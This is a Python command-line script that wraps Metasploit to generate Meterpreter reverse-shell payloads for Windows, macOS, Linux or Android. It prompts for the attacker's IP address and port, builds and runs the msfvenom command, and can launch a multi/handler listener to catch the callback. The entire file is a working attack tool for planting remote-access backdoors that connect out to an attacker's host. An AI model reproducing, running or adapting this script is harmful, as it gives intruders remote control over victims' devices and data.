import os
import time


class metasploit_generator():

    '''For this class, you need to have the metasploit framework installed.'''

    # https://en.redinskala.com/starting-a-handler-with-metasploit/
    # https://thedarksource.com/msfvenom-cheat-sheet-create-metasploit-payloads/

    def __init__(self):

        self.payload_name = input("Please enter a filename for the payload (with file extension): ")
        self.payload_location = input("Please enter the storage location: ")

        print("a) Window")
        print("b) MacOs")
        print("c) Linux")
        print("d) Android")

        self.attack_opperating_system_question = input("Please choose an operating system: ")

        if self.attack_opperating_system_question == "a":
            self.attack_operating_system = "windows"
            self.attack_file_type = " -f exe"
        elif self.attack_opperating_system_question == "b":
            self.attack_operating_system = "osx"
            self.attack_file_type = "-f macho"
        elif self.attack_opperating_system_question == "c":
            self.attack_operating_system = "linux"
            self.attack_file_type = " -f elf"
        elif self.attack_opperating_system_question == "d":
            self.attack_operating_system = "android"
            self.attack_file_type = " R"


        print("a) reverse_tcp")
        print("b) reverse_http")

        self.attack_method_question = input("Please choose an attack method: ")

        if self.attack_method_question == "a":
            self.attack_method = "reverse_tcp"
        elif self.attack_method_question == "b":
            self.attack_method = "reverse_http"

        self.attacker_ip_adress = input("Please enter your ip adress: ")
        self.attacker_port_nuber = input("Please enter your port: ")


        self.command = "msfvenom -p " + self.attack_operating_system + "/meterpreter/" + self.attack_method + " LHOST=" + self.attacker_ip_adress + " LPORT=" + self.attacker_port_nuber + self.attack_file_type + " > " + self.payload_location + self.payload_name

        print("Your Command: ")
        print(self.command)
        print("")
        self.run_now = input("Do you want to run it now? (y/n): ")

        if self.run_now == "y" or self.run_now == "Y":
            self.run_command()
        else:
            quit("Ok. Bye!")

    def run_command(self):

        try:
            os.system(self.command)
            time.sleep(2)

            self.ask_run_listener = input("Payload generation successfully finished. Do you want to run the listener now? (y/n): ")

            if self.ask_run_listener == "y" or self.ask_run_listener == "Y":
                self.run_listener()
            else:
                quit("Ok. Bye!")

        except:
            print("Could not run command.")


    def run_listener(self):

        try:

            self.listerner_string = "msfconsole -q -x 'use multi/handler;set payload " + self.attack_operating_system + "/meterpreter/" + self.attack_method + ";" + "set LHOST " + self.attacker_ip_adress + ";" + "set LPORT " + self.attacker_port_nuber + ";" + "exploit'"
            os.system(self.listerner_string)

        except:
            print("Could not start listener")




metasploit_generator()